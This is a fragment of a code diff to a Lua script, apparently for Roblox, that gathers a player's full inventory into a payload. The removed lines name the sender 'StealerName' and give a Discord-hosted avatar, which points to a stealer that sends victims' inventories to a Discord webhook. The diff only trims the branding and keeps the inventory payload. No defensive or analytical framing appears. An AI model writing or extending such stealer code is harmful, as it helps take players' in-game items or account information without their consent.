@@ -84,14 +84,13 @@ local success, errorMsg = pcall(function()
     end
     
     FullInventory()
-    
-    task.wait()
 
+    task.wait()
+    
     local data = {
-        username = StealerName,
-        avatar_url = "https://cdn.discordapp.com/attachments/1295330912900223039/1295610470228561972/standard.gif?ex=670f46c7&is=670df547&hm=d67f2702e28851f197035c849929a5d05b1f4b9e6830f463268c3234310d03ce&",
-        content = "🎒 **__Inventory__**\n```" .. FullInventory() .. "```"
+        content = FullInventory()
     }
+    
     
     
     
